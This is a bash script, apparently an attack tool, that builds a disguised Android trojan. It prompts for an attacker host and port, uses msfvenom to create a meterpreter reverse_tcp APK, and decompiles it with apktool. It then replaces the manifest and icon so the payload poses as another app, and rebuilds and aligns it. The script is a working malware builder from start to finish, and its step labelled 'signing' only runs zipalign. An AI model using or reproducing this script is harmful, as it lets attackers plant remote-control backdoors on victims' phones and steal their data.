#Author - kinghacker0
#Credit - Give me credit if you use any part of my code
clear
#Banner
echo -e "\e[33m                                        \e[0m"
echo -e "\e[33m    :::     ::::    ::: :::   :::            :::     :::::::::  :::    ::: \e[0m";
echo -e "\e[33m  :+: :+:   :+:+:   :+: :+:   :+:          :+: :+:   :+:    :+: :+:   :+:  \e[0m";
echo -e "\e[33m +:+   +:+  :+:+:+  +:+  +:+ +:+          +:+   +:+  +:+    +:+ +:+  +:+  \e[0m";
echo -e "\e[33m+#++:++#++: +#+ +:+ +#+   +#++:  :++#++: +#++:++#++: +#++:++#+  +#++:++   \e[0m";
echo -e "\e[33m+#+     +#+ +#+  +#+#+#    +#+           +#+     +#+ +#+        +#+  +#+  \e[0m";
echo -e "\e[33m#+#     #+# #+#   #+#+#    #+#           #+#     #+# #+#        #+#   #+#  \e[0m";
echo -e "\e[33m###     ### ###    ####    ###           ###     ### ###        ###    ### \e[0m";
echo -e "\e[33m                      [Coded By  :- @kinghacker0]                                        \e[0m"
echo -e "\e[33m                  [Github ID :- github.com/kinghacker0                               \e[0m"

echo -e "\e[55m                                 \e[1m"
read -p "[-]Enter Name Of Output Payload#~ :" payload
read -p "[-]Enter lhost#~ :" lhost
read -p "[-]Enter lport#~ :" lport
echo -e "\e[55m                                 \e[1m"
msfvenom -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport R> payload.apk
#decompile
apktool d payload.apk
cd payload/res && mkdir drawable
cd .. && rm AndroidManifest.xml
cd .. && cp AndroidManifest.xml payload
cp icon.png payload/res/drawable
#recompile
apktool b payload
cd payload && cd dist
mv payload.apk ..
cd .. && mv payload.apk ..
cd .. && rm -rf payload
echo -r "[-]Successfully Payload Generated!";
echo -e "\e[60m                                                              \e[0m"
#Signing the apk
echo -e "\e[96m                                 \e[2m"
echo "[-] Signing the final apk "
echo "  "
zipalign -v 4 payload.apk payload-signed.apk
rm payload.apk && mv payload-signed.apk $payload.apk

#Change this banner doesn't make you programmer
